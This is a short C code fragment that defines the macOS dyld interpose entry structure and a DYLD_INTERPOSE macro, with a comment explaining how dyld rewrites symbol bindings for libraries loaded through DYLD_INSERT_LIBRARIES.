/* The DYLD interpose table format: per-symbol record with two function
 * pointers, placed in the __DATA,__interpose section. dyld notices
 * libraries loaded via DYLD_INSERT_LIBRARIES that carry this section
 * and rewrites the matching symbol bindings in the host process. */
struct dyld_interpose_entry {
    const void *replacement;
    const void *original;
};
#define DYLD_INTERPOSE(replacement_, original_)                                \
    __attribute__((used))                                                      \
    static const struct dyld_interpose_entry _interpose_##original_            \
        __attribute__((section("__DATA,__interpose"))) = {                     \
            (const void *)(uintptr_t)&replacement_,                            \
            (const void *)(uintptr_t)&original_,                               \
    };

